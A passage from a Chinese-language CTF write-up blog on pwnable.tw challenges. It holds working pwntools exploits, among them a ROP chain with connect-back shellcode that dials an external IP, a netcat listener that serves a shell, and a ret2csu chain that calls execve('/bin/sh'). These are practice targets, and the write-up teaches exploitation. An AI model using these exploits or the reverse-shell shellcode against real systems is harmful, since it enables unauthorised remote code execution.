class="number">0x80481c9</span></span><br><span class="line">int80 = <span class="number">0x806f290</span></span><br><span class="line">ppp = <span class="number">0x804847e</span></span><br><span class="line">jmp_esp = <span class="number">0x80bd13b</span></span><br><span class="line"></span><br><span class="line">remote_add = <span class="number">0x80ebf80</span></span><br><span class="line">flag_add = <span class="number">0x80ebfc0</span></span><br><span class="line"></span><br><span class="line">_dl_make_stack_executable = <span class="number">0x809a080</span></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">8</span> + p32(<span class="number">0</span>) + p32(pop_eax) + p32(<span class="number">7</span>) + p32(pop_edx) + p32(elf.symbols[<span class="string">&#x27;__stack_prot&#x27;</span>]) + p32(mov_val) + \</span><br><span class="line">        p32(pop_eax) + p32(elf.symbols[<span class="string">&#x27;__libc_stack_end&#x27;</span>])+p32(_dl_make_stack_executable) + p32(jmp_esp)</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    /* socket(2, 1, 0) */</span></span><br><span class="line"><span class="string">    push 2</span></span><br><span class="line"><span class="string">    push 1</span></span><br><span class="line"><span class="string">    push 0x167</span></span><br><span class="line"><span class="string">    pop eax</span></span><br><span class="line"><span class="string">    pop ecx</span></span><br><span class="line"><span class="string">    pop ebx</span></span><br><span class="line"><span class="string">    xor edx, edx</span></span><br><span class="line"><span class="string">    int 0x80</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /* connect(0, addr, 0x10) */</span></span><br><span class="line"><span class="string">    xor ebx, ebx</span></span><br><span class="line"><span class="string">    push 0x10</span></span><br><span class="line"><span class="string">    pop edx</span></span><br><span class="line"><span class="string">    push 0x16a</span></span><br><span class="line"><span class="string">    pop eax</span></span><br><span class="line"><span class="string">    push 0x58131976</span></span><br><span class="line"><span class="string">    push 0x11270002</span></span><br><span class="line"><span class="string">    mov ecx, esp</span></span><br><span class="line"><span class="string">    int 0x80</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    push 3</span></span><br><span class="line"><span class="string">    pop eax</span></span><br><span class="line"><span class="string">    push 0xffff</span></span><br><span class="line"><span class="string">    pop edx</span></span><br><span class="line"><span class="string">    int 0x80</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">payload += asm(shellcode)</span><br><span class="line"></span><br><span class="line"><span class="comment">#attach(io, &#x27;b *0x809a0c6&#x27;)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div>

<p>服务端数据</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.arch=<span class="string">&#x27;x86&#x27;</span></span><br><span class="line"></span><br><span class="line">io = process([<span class="string">&#x27;nc&#x27;</span>, <span class="string">&#x27;-lnvp&#x27;</span>, <span class="string">&#x27;10001&#x27;</span>])</span><br><span class="line"></span><br><span class="line">shellcode = shellcraft.dup2(<span class="number">0</span>, <span class="number">1</span>) + shellcraft.sh()</span><br><span class="line">shellcode = asm(shellcode)</span><br><span class="line"></span><br><span class="line">io.send(<span class="string">b&#x27;A&#x27;</span>*<span class="number">0x3c</span>+shellcode)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div>

<p>其实还尝试了不拿shell，读取目录，尝试读flag文件，但是那个flag文件似乎没有读权限，只能通过运行<code>get_flag</code>程序得到</p>
<h2 id="unexploitable"><a href="#unexploitable" class="headerlink" title="unexploitable"></a>unexploitable</h2><p>连续ret2csu先修改sleep_got偏移到附近syscall，再给bss段上read一个bin_sh同时控制rax为0x3b，然后直接execve</p>
<p>exp:</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;chall.pwnable.tw&#x27;</span>,<span class="number">10403</span>)</span><br><span class="line"><span class="comment">#io = process(&#x27;./unexploitable&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./unexploitable&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc_64.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#attach(io, &#x27;b *0x400577&#x27;)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line">csu_gadget1 = <span class="number">0x4005e6</span></span><br><span class="line">csu_gadget2 = <span class="number">0x4005d0</span></span><br><span class="line">read_got = <span class="number">0x601000</span></span><br><span class="line">sleep_got = <span class="number">0x601010</span></span><br><span class="line">bin_sh = <span class="number">0x601700</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x18</span> + \</span><br><span class="line">          p64(csu_gadget1) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(read_got) + p64(<span class="number">0</span>) + p64(sleep_got) + p64(<span class="number">1</span>) + \</span><br><span class="line">          p64(csu_gadget2) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(read_got) + p64(<span class="number">0</span>) + p64(bin_sh) + p64(<span class="number">0x3b</span>) + \</span><br><span class="line">          p64(csu_gadget2) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(sleep_got) + p64(bin_sh) + p64(<span class="number">0</span>)*<span class="number">2</span> + p64(csu_gadget2)</span><br><span class="line">io.send(payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;A&#x27;</span>))</span><br><span class="line"></span><br><span class="line">io.send(<span class="string">b&#x27;\x55&#x27;</span>)</span><br><span class="line">io.send(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>.ljust(<span class="number">0x3b</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div>


        </div>

        
            <div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
                <div class="article-copyright-info-container">
    <ul>
        <li><strong>Title:</strong> pwnable.tw wp</li>
        <li><strong>Author:</strong> Static</li>
        <li><strong>Created at
                :</strong> 2024-01-23 15:53:13</li>
        
            <li>
                <strong>Updated at
                    :</strong> 2023-12-30 22:01:25
            </li>
        
        <li>
            <strong>Link:</strong> https://staticccccccc.github.io/2024/01/23/pwnable_tw_wp/
        </li>
        <li>
            <strong>
                License:
            </strong>
            

            
                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
            
        </li>
    </ul>
</div>

            </div>
        

        

        

        
            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
                
                    <div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
                        <a class="prev"
                        rel="prev"
                        href="/2024/01/23/WMCTF2023%20wp%20&amp;%20%E5%A4%8D%E7%8E%B0/"
                        >
                            <span class="left arrow-icon flex justify-center items-center">
                                <i class="fa-solid fa-chevron-left"></i>
                            </span>
                            <span class="title flex justify-center items-center">
                                <span class="post-nav-title-item">WMCTF2023 wp &amp; 复现</span>
                                <span class="post-nav-item">Prev posts</span>
                            </span>
                        </a>
                    </div>
                
                
                    <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
                        <a class="next"
                        rel="next"
                        href="/2024/01/23/minilctf%20wp/"
                        >
                            <span class="title flex justify-center items-center">
                                <span class="post-nav-title-item">minilctf2023 pwn wp &amp; 复现</span>
                                <span class="post-nav-item">Next posts</span>
                            </span>
                            <span class="right arrow-icon flex justify-center items-center">
                                <i class="fa-solid fa-chevron-right"></i>
                            </span>
                        </a>
                    </div>
                
            </div>
        


        
            <div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
                <div class="comments-container mt-10 w-full ">
    <div id="comment-anchor" class="w-full h-2.5"></div>
    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
        Comments
    </div>
    

        
            
    <div id="waline"></div>
    <script type="module" data-swup-reload-script>
      import { init } from '/js/libs/waline.mjs';

      function loadWaline() {
        init({
          el: '#waline',
          serverURL: 'https://example.example.com',
          lang: 'zh-CN',
          dark: 'body[class~="dark-mode"]',
          requiredMeta: ['nick', 'mail'],
          emoji: [],
          recaptchaV3Key: "wasd",
          
        });
      }

      if (typeof swup !== 'undefined') {
        loadWaline();
      } else {
        window.addEventListener('DOMContentLoaded', loadWaline);
      }
    </script>



        
    
</div>

            </div>
        
    </div>

    
        <div class="toc-content-container">
            <div class="post-toc-wrap">
    <div class="post-toc">
        <div class="toc-title">On this page</div>
        <div class="page-title">pwnable.tw wp</div>
        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-start"><span class="nav-text">0x00. start</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-orw"><span class="nav-text">0x01. orw</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-CVE-2018-1160-%E2%80%94-wait-to-solve"><span class="nav-text">0x02. CVE-2018-1160 — wait to solve</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-calc"><span class="nav-text">0x03. calc</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-3%C3%9717"><span class="nav-text">0x04. 3×17</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-dubblesort"><span class="nav-text">0x05. dubblesort</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x06-hacknote"><span class="nav-text">0x06. hacknote</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x07-Silver-Bullet"><span class="nav-text">0x07. Silver Bullet</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x08-applestore"><span class="nav-text">0x08. applestore</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x09-re-alloc"><span class="nav-text">0x09. re-alloc</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%B3%E4%BA%8Erealloc"><span class="nav-text">关于realloc</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x0a-tcache-tear"><span class="nav-text">0x0a. tcache_tear</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%89%93%E6%B3%951%E2%80%94%E7%88%86%E7%A0%B4tcache-struct-%E7%88%86%E7%A0%B4stdout"><span class="nav-text">打法1—爆破tcache_struct+爆破stdout</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%89%93%E6%B3%952%E2%80%94bss%E6%AE%B5%E4%BC%AA%E9%80%A0%E5%A0%86%E5%9D%97%E6%B3%84%E9%9C%B2libc"><span class="nav-text">打法2—bss段伪造堆块泄露libc</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x0b-seethefile"><span class="nav-text">0x0b. seethefile</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x0c-death-note"><span class="nav-text">0x0c. death_note</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x0d-starbound"><span class="nav-text">0x0d. starbound</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x0e-spirited-away"><span class="nav-text">0x0e. spirited_away</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x0f-babystack"><span class="nav-text">0x0f. babystack</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x10-CVE-2018-10387-%E2%80%94-wait-to-solve"><span class="nav-text">0x10. CVE-2018-10387 — wait to solve</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x11-Bounty-Program-a-%E2%80%94-wait-to-solve"><span class="nav-text">0x11. Bounty Program a — wait to solve</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x12-secretgarden"><span class="nav-text">0x12. secretgarden</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x13-alive-note"><span class="nav-text">0x13. alive_note</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x14-bookwriter"><span class="nav-text">0x14. bookwriter</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x15-CAOV"><span class="nav-text">0x15. CAOV</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x16-Heap-Paradise"><span class="nav-text">0x16. Heap Paradise</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x17-Re-alloc-Revenge"><span class="nav-text">0x17. Re-alloc Revenge</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x18-MnO2"><span class="nav-text">0x18. MnO2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x19-Secret-Of-My-Heart"><span class="nav-text">0x19. Secret Of My Heart</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x1a-Kidding"><span class="nav-text">0x1a. Kidding</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#unexploitable"><span class="nav-text">unexploitable</span></a></li></ol>

    </div>
</div>
        </div>
    
</div>



                

            </div>

            

        </div>

        <div class="main-content-footer">
            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
    <div class="info-container py-3 text-center">
        
        <div class="text-center">
            &copy;
            
              <span>2022</span>
              -
            
            2024&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">Static</a>
        </div>
        
            <script data-swup-reload-script src="https://cn.vercount.one/js"></script>
            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
                
                    <span id="busuanzi_container_site_uv" class="lg:!block">
                        <span class="text-sm">VISITOR COUNT</span>
                        <span id="busuanzi_value_site_uv"></span>
                    </span>
                
                
                    <span id="busuanzi_container_site_pv" class="lg:!block">
                        <span class="text-sm">TOTAL PAGE VIEWS</span>
                        <span id="busuanzi_value_site_pv"></span>
                    </span>
                
            </div>
        
        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.6.0</a></span>
        </div>
        
        
            <div>
                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
            </div>
        
        
            <script data-swup-reload-script>
                try {
                    function odometer_init() {
                    const elements = document.querySelectorAll('.odometer');
                    elements.forEach(el => {
                        new Odometer({
                            el,
                            format: '( ddd).dd',
                            duration: 200
                        });
                    });
                    }
                    odometer_init();
                } catch (error) {}
            </script>
        
        
        
    </div>  
</footer>
        </div>
    </div>

    
        <div class="post-tools">
            <div class="post-tools-container">
    <ul class="article-tools-list">
        <!-- TOC aside toggle -->
        
            <li class="right-bottom-tools page-aside-toggle">
                <i class="fa-regular fa-outdent"></i>
            </li>
        

        <!-- go comment -->
        
            <li class="go-comment">
                <i class="fa-regular fa-comments"></i>
            </li>
        
    </ul>
</div>

        </div>
    

    <div class="right-side-tools-container">
        <div class="side-tools-container">
    <ul class="hidden-tools-list">
        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
            <i class="fa-regular fa-magnifying-glass-plus"></i>
        </li>

        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
            <i class="fa-regular fa-magnifying-glass-minus"></i>
        </li>

        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
            <i class="fa-regular fa-moon"></i>
        </li>

        <!-- rss -->
        

        

        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
            <i class="fa-regular fa-arrow-down"></i>
        </li>
    </ul>

    <ul class="visible-tools-list">
        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
            <i class="fa-regular fa-cog fa-spin"></i>
        </li>
        
            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
                <i class="arrow-up fas fa-arrow-up"></i>
                <span class="percent"></span>
            </li>
        
        
    </ul>
</div>

    </div>

    <div class="image-viewer-container">
    <img src="">
</div>


    

</main>


    
<script src="/js/libs/Swup.min.js"></script>

<script src="/js/libs/SwupSlideTheme.min.js"></script>

<script src="/js/libs/SwupScriptsPlugin.min.js"></script>

<script src="/js/libs/SwupProgressPlugin.min.js"></script>

<script src="/js/libs/SwupScrollPlugin.min.js"></script>

<script src="/js/libs/SwupPreloadPlugin.min.js"></script>

<script>
    const swup = new Swup({
        plugins: [
            new SwupScriptsPlugin({
                optin: true,
            }),
            new SwupProgressPlugin(),
            new SwupScrollPlugin({
                offset: 80,
            }),
            new SwupSlideTheme({
                mainElement: ".main-content-body",
            }),
            new SwupPreloadPlugin(),
        ],
        containers: ["#swup"],
    });
</script>







<script src="/js/tools/imageViewer.js" type="module"></script>

<script src="/js/utils.js" type="module"></script>

<script src="/js/main.js" type="module"></script>

<script src="/js/layouts/navbarShrink.js" type="module"></script>

<script src="/js/tools/scrollTopBottom.js" type="module"></script>

<script src="/js/tools/lightDarkSwitch.js" type="module"></script>

<script src="/js/layouts/categoryList.js" type="module"></script>





    
<script src="/js/tools/codeBlock.js" type="module"></script>




    
<script src="/js/layouts/lazyload.js" type="module"></script>




    
<script src="/js/tools/runtime.js"></script>

    
<script src="/js/libs/odometer.min.js"></script>

    
<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">




  
<script src="/js/libs/Typed.min.js"></script>

  
<script src="/js/plugins/typed.js" type="module"></script>









<div class="post-scripts" data-swup-reload-script>
    
        
<script src="/js/tools/tocToggle.js" type="module"></script>

<script src="/js/layouts/toc.js" type="module"></script>

<script src="/js/plugins/tabs.js" type="module"></script>

    
</div>


</body>
</html>
